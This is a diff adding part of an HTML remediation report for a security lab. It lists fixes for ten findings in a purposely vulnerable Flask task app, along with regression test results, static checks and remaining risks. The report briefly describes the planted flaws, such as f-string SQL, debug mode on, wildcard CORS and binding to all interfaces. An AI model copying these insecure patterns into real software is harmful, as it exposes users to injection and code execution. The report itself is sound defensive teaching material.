+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev medium">Medium</span><span class="tag">CWE-94</span><span class="tag">OWASP A05:2021</span><span class="tag">config.py:22</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Before:</strong> <code>DEBUG = True</code> — activates Werkzeug's interactive debugger: arbitrary Python execution from any browser on an unhandled exception.</p>
+  <p><strong>After:</strong> <code>DEBUG = os.getenv("FLASK_DEBUG", "false").lower() == "true"</code> — off by default, opt-in only via environment.</p>
+  <p><strong>Regression tests:</strong> <code>TestF08DebugMode</code> — 1 test: asserts <code>config.DEBUG is False</code> when <code>FLASK_DEBUG</code> is unset.</p>
+</section>
+
+<!-- F-09 -->
+<section id="f09">
+  <h2>F-09 — No Input Validation on Create / Update</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev medium">Medium</span><span class="tag">CWE-20</span><span class="tag">OWASP A03:2021</span><span class="tag">app.py:45</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Before:</strong> <code>payload = request.get_json()</code> with no checks — a null body caused <code>AttributeError</code> (leaked by F-06), non-string types were silently coerced, unbounded lengths enabled storage DoS.</p>
+  <p><strong>After — shared validator exported alongside a named constant:</strong></p>
+  <pre>MAX_TITLE_LENGTH = 200
+MAX_DESCRIPTION_LENGTH = 2000
+
+def validate_task_payload(payload):
+    if not isinstance(payload, dict):              return "Request body must be a JSON object.", 400
+    title = payload.get("title")
+    if not isinstance(title, str) or not title.strip(): return "title must be a non-empty string.", 400
+    if len(title) > MAX_TITLE_LENGTH:              return f"title must be ≤{MAX_TITLE_LENGTH} chars.", 400
+    description = payload.get("description", "")
+    if not isinstance(description, str):           return "description must be a string.", 400
+    if len(description) > MAX_DESCRIPTION_LENGTH:  return "description too long.", 400
+    completed = payload.get("completed", False)
+    if not isinstance(completed, bool):            return "completed must be a boolean.", 400
+    return None, None</pre>
+  <p><strong>Regression tests:</strong> <code>TestF09InputValidation</code> — 16 tests: null body, missing title, empty title, integer title, list title, title over limit, description over limit, non-string description, non-boolean completed, valid payload (201), update variants, unit tests for the validator directly, and <code>MAX_TITLE_LENGTH</code> export. Also covered by <code>test_blank_title_is_rejected</code> and <code>test_non_boolean_completed_is_rejected</code> in the external suite.</p>
+</section>
+
+<!-- F-10 -->
+<section id="f10">
+  <h2>F-10 — Server Bound to 0.0.0.0 by Default</h2>
+  <div style="display:flex;gap:7px;margin-bottom:12px;flex-wrap:wrap">
+    <span class="sev low">Low</span><span class="tag">CWE-668</span><span class="tag">OWASP A05:2021</span><span class="tag">config.py:24</span><span class="status fixed">Fixed</span>
+  </div>
+  <p><strong>Before:</strong> <code>HOST = os.getenv("APP_HOST", "0.0.0.0")</code> — on a cloud VM with a public IP, all findings became internet-reachable without any firewall change.</p>
+  <p><strong>After:</strong> <code>HOST = os.getenv("APP_HOST", "127.0.0.1")</code> — loopback by default; operators who need external access must explicitly set <code>APP_HOST</code>.</p>
+</section>
+
+<!-- REMEDIATIONS SUMMARY -->
+<section id="remediations">
+  <h2>Phase 2 — Remediations Summary</h2>
+  <div class="callout success"><span class="callout-icon">✓</span><p><strong>vulnerable-app/ was never modified.</strong> Checksums of all six source files confirmed unchanged throughout the entire exercise.</p></div>
+  <p>All fixes were applied in <code>secure-app/</code> — a separate copy created at the start of the exercise. Each finding maps to a targeted, minimal change in one or two files.</p>
+</section>
+
+<section id="files-changed">
+  <h2>Files Changed in secure-app/</h2>
+  <table>
+    <thead><tr><th>File</th><th>Change</th><th>Findings Covered</th></tr></thead>
+    <tbody>
+      <tr><td><code>backend/config.py</code></td><td>Full rewrite — env-var secrets, safe startup failure, loopback default, debug off, restricted CORS</td><td>F-03, F-07, F-08, F-10</td></tr>
+      <tr><td><code>backend/app.py</code></td><td>Full rewrite — parameterized SQL, config endpoint removed, input validator, generic errors, HTTPException passthrough, constant-time compare</td><td>F-01, F-02, F-05, F-06, F-09</td></tr>
+      <tr><td><code>backend/.env.example</code></td><td>All real/fake values replaced with descriptive non-secret instruction strings</td><td>F-03</td></tr>
+      <tr><td><code>frontend/app.js</code></td><td>innerHTML removed; <code>buildTaskCard()</code> uses <code>createElement</code> + <code>textContent</code> + <code>addEventListener</code> throughout</td><td>F-04, F-06</td></tr>
+      <tr><td><code>frontend/index.html</code></td><td>Title, meta description, badge text updated to reflect secure version</td><td>—</td></tr>
+      <tr><td><code>backend/tests/test_security.py</code></td><td>New file — 45 regression tests, one class per finding plus functional smoke suite</td><td>All</td></tr>
+      <tr><td><code>security_verification.py</code></td><td>Fixed false-positive in <code>exposed_secret</code> check (substring → active-decorator regex)</td><td>F-02 checker</td></tr>
+    </tbody>
+  </table>
+  <p style="margin-top:10px;font-size:12.5px"><code>database.py</code> and <code>styles.css</code> were not modified — no findings applied to them.</p>
+</section>
+
+<!-- TESTS -->
+<section id="tests">
+  <h2>Phase 3 — Test Results</h2>
+
+  <div class="test-suite">
+    <div class="ts-header">
+      <span class="status fixed">2 / 2</span>
+      <span class="ts-cmd">LAB_TARGET=secure-app python3 -m unittest tests.test_api -v</span>
+    </div>
+    <div class="tlist">
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_health</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_create_update_search_delete</span><span class="tok">ok</span></div>
+    </div>
+  </div>
+
+  <div class="test-suite">
+    <div class="ts-header">
+      <span class="status fixed">4 / 4</span>
+      <span class="ts-cmd">LAB_TARGET=secure-app python3 -m unittest tests.test_security_regression -v</span>
+    </div>
+    <div class="tlist">
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_blank_title_is_rejected</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_config_endpoint_does_not_expose_secrets</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_non_boolean_completed_is_rejected</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">test_sql_injection_does_not_bypass_search</span><span class="tok">ok</span></div>
+    </div>
+  </div>
+
+  <div class="test-suite">
+    <div class="ts-header">
+      <span class="status fixed">45 / 45</span>
+      <span class="ts-cmd">pytest secure-app/backend/tests/test_security.py -v</span>
+    </div>
+    <div class="tlist">
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF01SQLInjection::test_union_injection_returns_only_tasks</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF01SQLInjection::test_or_true_injection_does_not_return_all_rows</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF01SQLInjection::test_normal_search_still_works</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF01SQLInjection::test_drop_table_injection_does_not_error</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF02ConfigEndpointRemoved::test_config_endpoint_returns_404</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF02ConfigEndpointRemoved::test_config_response_body_contains_no_secrets</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF03HardcodedCredentials::test_config_module_has_no_hardcoded_secrets</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF03HardcodedCredentials::test_missing_env_var_raises_runtime_error</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF03HardcodedCredentials::test_config_reads_secret_key_from_env</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF03HardcodedCredentials::test_debug_defaults_to_false</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF03HardcodedCredentials::test_host_defaults_to_loopback</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF04StoredXSSPrevention::test_xss_payload_stored_and_returned_verbatim</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF04StoredXSSPrevention::test_search_result_contains_xss_title_as_text</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF05AdminVerifyNoSecretLeak::test_correct_password_returns_authenticated_true</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF05AdminVerifyNoSecretLeak::test_correct_password_does_not_return_api_key</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF05AdminVerifyNoSecretLeak::test_correct_password_does_not_return_secret_key</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF05AdminVerifyNoSecretLeak::test_wrong_password_returns_401</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF05AdminVerifyNoSecretLeak::test_null_body_returns_401_not_500</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF06VerboseErrorHandler::test_null_body_on_create_returns_400_not_500</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF06VerboseErrorHandler::test_error_response_has_no_internal_details</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF07CORSPolicy::test_allowed_origin_receives_acao_header</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF07CORSPolicy::test_wildcard_is_never_returned</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF07CORSPolicy::test_disallowed_origin_does_not_receive_acao</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF08DebugMode::test_app_debug_is_false</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_null_body_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_missing_title_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_empty_title_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_integer_title_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_list_title_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_title_too_long_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_description_too_long_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_non_string_description_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_non_boolean_completed_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_valid_payload_returns_201</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_update_null_body_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_update_title_too_long_returns_400</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_update_valid_payload_returns_200</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_validate_returns_none_for_valid_payload</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_validate_rejects_none</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestF09InputValidation::test_max_title_length_constant_is_exported</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestFunctionalSmoke::test_health_check</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestFunctionalSmoke::test_list_tasks_returns_list</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestFunctionalSmoke::test_create_list_delete_cycle</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestFunctionalSmoke::test_search_returns_matching_tasks</span><span class="tok">ok</span></div>
+      <div class="tr"><span class="tdot pass"></span><span class="tname">TestFunctionalSmoke::test_search_empty_query_returns_all</span><span class="tok">ok</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- STATIC CHECKS -->
+<section id="static-checks">
+  <h2>Static Security Checks — python3 security_verification.py</h2>
+  <div style="border:1px solid var(--border);border-radius:9px;overflow:hidden;margin-bottom:14px">
+    <div style="display:grid;grid-template-columns:1fr 1fr;border-bottom:1px solid var(--border)">
+      <div style="padding:8px 14px;background:var(--red-bg);font-size:11.5px;font-weight:700;color:var(--red)">vulnerable-app — 0 / 6 (expected)</div>
+      <div style="padding:8px 14px;background:var(--green-bg);font-size:11.5px;font-weight:700;color:var(--green)">secure-app — 6 / 6</div>
+    </div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>No hardcoded or exposed application secrets</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>No hardcoded or exposed application secrets</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>Search query is parameterized</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>Search query is parameterized</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>User content uses safe DOM rendering</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>User content uses safe DOM rendering</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>Task input validation is implemented</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>Task input validation is implemented</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>Internal errors are not returned to clients</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>Internal errors are not returned to clients</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+    <div class="check-row"><span class="fail-txt">FAIL</span><span>Debug and CORS defaults are secure</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">vulnerable-app</span></div>
+    <div class="check-row"><span class="pass-txt">PASS</span><span>Debug and CORS defaults are secure</span><span style="margin-left:auto;font-size:11px;color:var(--green)">secure-app</span></div>
+  </div>
+  <div class="callout note"><span class="callout-icon">ℹ</span><p><strong>One checker fix required:</strong> The <code>exposed_secret</code> check used a plain substring search for <code>/api/admin/config</code>. Two comment lines documenting the removal (e.g. <code># F-02: /api/admin/config removed</code>) triggered a false-positive FAIL in <code>secure-app</code>. The pattern was tightened to match only an active <code>@app.get</code> decorator. <code>vulnerable-app</code> still scores 0/6.</p></div>
+</section>
+
+<!-- BEFORE / AFTER TABLE -->
+<section id="before-after">
+  <h2>Before vs After — Full Comparison</h2>
+  <table>
+    <thead><tr><th>Finding</th><th>Severity</th><th>Before</th><th>After</th><th>Status</th></tr></thead>
+    <tbody>
+      <tr><td><strong>F-01</strong> SQL Injection</td><td><span class="sev critical">Critical</span></td><td>f-string SQL interpolation</td><td>Parameterized <code>LIKE ?</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-02</strong> Config endpoint</td><td><span class="sev critical">Critical</span></td><td>Route exposes all secrets unauthenticated</td><td>Route deleted → 404</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-03</strong> Hardcoded creds</td><td><span class="sev critical">Critical</span></td><td>String literals in source</td><td><code>_require_env()</code> — fails fast on missing var</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-04</strong> Stored XSS</td><td><span class="sev high">High</span></td><td><code>innerHTML</code> template literal</td><td><code>textContent</code> + DOM API only</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-05</strong> Key leak on auth</td><td><span class="sev high">High</span></td><td>Returns <code>api_key</code> in response body</td><td><code>{authenticated:true}</code> only; constant-time compare</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-06</strong> Verbose errors</td><td><span class="sev high">High</span></td><td>Returns <code>str(error)</code> and class name</td><td>Generic message; full detail logged server-side only</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-07</strong> Wildcard CORS</td><td><span class="sev medium">Medium</span></td><td><code>CORS_ORIGINS = "*"</code></td><td>Parsed list from <code>ALLOWED_ORIGINS</code> env var</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-08</strong> Debug mode</td><td><span class="sev medium">Medium</span></td><td><code>DEBUG = True</code></td><td><code>FLASK_DEBUG</code> env var, default false</td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-09</strong> No validation</td><td><span class="sev medium">Medium</span></td><td>No type / length / presence checks</td><td><code>validate_task_payload()</code> + <code>MAX_TITLE_LENGTH</code></td><td><span class="status fixed">Fixed</span></td></tr>
+      <tr><td><strong>F-10</strong> Bind 0.0.0.0</td><td><span class="sev low">Low</span></td><td>Default <code>0.0.0.0</code></td><td>Default <code>127.0.0.1</code></td><td><span class="status fixed">Fixed</span></td></tr>
+    </tbody>
+  </table>
+  <p style="margin-top:10px;font-weight:700;color:var(--green)">All 10 findings are fully resolved. No findings are partially fixed or still open.</p>
+</section>
+
+<!-- REMAINING RISKS -->
+<section id="remaining">
+  <h2>Remaining Risks &amp; Recommended Next Steps</h2>
+  <p>The 10 lab findings are resolved. These items are out-of-scope for this exercise but relevant for a real production deployment:</p>
+  <table>
+    <thead><tr><th>ID</th><th>Risk</th><th>Severity</th><th>Recommendation</th></tr></thead>
+    <tbody>
+      <tr><td>R-01</td><td>No authentication on task endpoints</td><td><span class="sev medium">Medium</span></td><td>Add Flask-JWT-Extended; ownership checks on every write</td></tr>
+      <tr><td>R-02</td><td>No rate-limiting on <code>/api/admin/verify</code></td><td><span class="sev medium">Medium</span></td><td>Flask-Limiter, 5 req/min/IP, lockout strategy</td></tr>
+      <tr><td>R-03</td><td>No HTTPS / TLS</td><td><span class="sev medium">Medium</span></td><td>TLS-terminating reverse proxy (nginx, Caddy) + <code>Secure</code> cookies</td></tr>
+      <tr><td>R-04</td><td>No Content-Security-Policy header</td><td><span class="sev low">Low</span></td><td>Add <code>default-src 'self'</code> via Flask <code>after_request</code> hook</td></tr>
+      <tr><td>R-05</td><td>SQLite — single process only</td><td><span class="sev info">Info</span></td><td>Replace with PostgreSQL for multi-worker deployments</td></tr>
+      <tr><td>R-06</td><td>Git history retains fake credential strings</td><td><span class="sev low">Low</span></td><td>Confirm all are non-functional; add <code>detect-secrets</code> pre-commit hook</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<div class="footer">Made with IBM Bob</div>
+</main>
+</div>
+
+<script>
+(function(){
+  // Active nav highlight on scroll
+  var secs = document.querySelectorAll('section[id]');
+  var links = document.querySelectorAll('nav a');
+  function highlight(){
+    var y = window.scrollY + 100;
+    var cur = '';
+    secs.forEach(function(s){ if(s.offsetTop <= y) cur = s.id; });
+    links.forEach(function(a){
+      a.classList.toggle('active', a.getAttribute('href') === '#'+cur);
+    });
+  }
+  window.addEventListener('scroll', highlight, {passive:true});
+  highlight();
+
+  // Smooth scroll
+  links.forEach(function(a){
+    a.addEventListener('click', function(e){
+      var h = a.getAttribute('href');
+      if(h && h[0]==='#'){
+        var t = document.querySelector(h);
+        if(t){ e.preventDefault(); t.scrollIntoView({behavior:'smooth',block:'start'}); }
+      }
+    });
+  });
+
+  // Sortable finding table (first table with thead th)
+  var table = document.querySelector('#findings table');
+  if(table){
+    var ths = table.querySelectorAll('th');
+    ths.forEach(function(th, ci){
+      th.style.cursor='pointer';
+      th.title='Sort by this column';
+      var asc=true;
+      th.addEventListener('click', function(){
+        var tb = table.querySelector('tbody');
+        var rows = Array.from(tb.querySelectorAll('tr'));
+        rows.sort(function(a,b){
+          var at = (a.cells[ci]||{}).textContent||'';
+          var bt = (b.cells[ci]||{}).textContent||'';
+          return asc ? at.localeCompare(bt) : bt.localeCompare(at);
+        });
+        asc = !asc;
+        rows.forEach(function(r){ tb.appendChild(r); });
+      });
+    });
+  }
+})();
+</script>
+</body>
+</html>
